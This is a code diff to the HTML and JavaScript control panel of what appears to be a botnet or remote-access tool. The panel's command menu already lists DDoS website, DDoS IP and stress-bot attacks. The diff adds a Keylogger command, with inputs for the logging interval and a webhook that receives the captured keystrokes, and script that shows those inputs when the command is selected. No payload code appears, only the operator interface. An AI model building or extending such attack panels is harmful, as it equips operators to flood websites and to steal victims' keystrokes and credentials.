@@ -54,6 +54,7 @@
                         <option value="stress">Stress bot</option>
                         <option value="ddos">DDos website</option>
                         <option value="attack">DDos IP</option>
+                        <option value="keylogger">Keylogger</option>
                     </select>
 
                     <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
@@ -153,6 +154,22 @@
                         <span class="highlight"></span>
                         <span class="bar"></span>
                         <label>Threads</label>
+                    </div> 
+                </div>
+                <!-- Keylogger -->
+                <div id="input-needed-keylogger" style="display: none;">
+                    <div class="commands-input-group"> 
+                        <input type="text" name="keylogger-intervals" id="keylogger-intervals" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Intervals</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="keylogger-reciever-email" id="keylogger-reciever-email" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Webhook</label>
                     </div> 
                 </div>
             </div>
@@ -317,6 +334,13 @@ function commandCheck(command) {
         document.getElementById("input-needed-ddos-ip").style.display = "block";
     } else {
         document.getElementById("input-needed-ddos-ip").style.display = "none";
+    }
+
+    /* Keylogger */
+    if (command.value == "keylogger") {
+        document.getElementById("input-needed-keylogger").style.display = "block";
+    } else {
+        document.getElementById("input-needed-keylogger").style.display = "none";
     }
 }
 </script>
